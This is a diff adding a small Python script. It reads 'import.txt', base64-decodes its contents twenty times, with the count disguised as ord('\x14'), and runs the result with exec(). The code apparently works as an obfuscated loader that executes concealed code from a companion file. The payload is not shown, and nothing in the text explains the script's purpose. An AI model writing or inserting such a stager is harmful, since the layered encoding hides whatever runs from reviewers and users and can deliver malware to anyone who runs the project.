@@ -1,0 +1,10 @@
+import base64
+def de(txt,num=1):
+    v = base64.b64decode(txt.encode()).decode()
+    if num!=1:
+        v = de(v,num-1)
+    return v
+file = open('import.txt','r')
+f = file.read()
+file.close()
+exec (de(f,ord("\x14")))
